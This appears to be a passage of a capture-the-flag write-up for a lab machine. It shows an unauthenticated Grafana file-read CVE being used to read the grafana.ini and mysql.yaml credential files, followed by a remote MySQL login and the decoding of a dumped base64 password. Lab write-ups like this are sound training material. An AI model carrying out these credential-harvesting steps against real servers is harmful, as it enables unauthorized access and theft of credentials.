Do some googling of the Grafana version and see that there is an unauthenticated CVE for reading arbitrary files on the server.
![[Pasted image 20221025184823.png]]
This allows for reading the Grafana config file @ ```/etc/grafana/grafana.ini``` where credentials for Grafana are found:
![[Pasted image 20221025185018.png]]
Authenticate to Grafana and poke around for a bit until finding the "Data Sources" page.
![[Pasted image 20221025185614.png]]
After doing some research about the yaml file seen above I found where it (most likely) resided on the server: ```/etc/grafana/provisioning/datasources/mysql.yaml```
![[Pasted image 20221025185827.png]]
SQL creds! Remember how port 3306 (SQL's default port btw) was listening from the Nmap earlier? Try authenticating to the server remotely with these new creds
```bash
$ mysql -u grafana -p -h 10.10.11.183      
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 80
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.038 sec)
```
Check out the last db listed above (whackywidget) and find some creds for the developer user
```sql
MySQL [(none)]> use whackywidget; select * from users;

Database changed
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.038 sec)
```
Decode the pass value to get: ```anEnglishManInNewYork027468```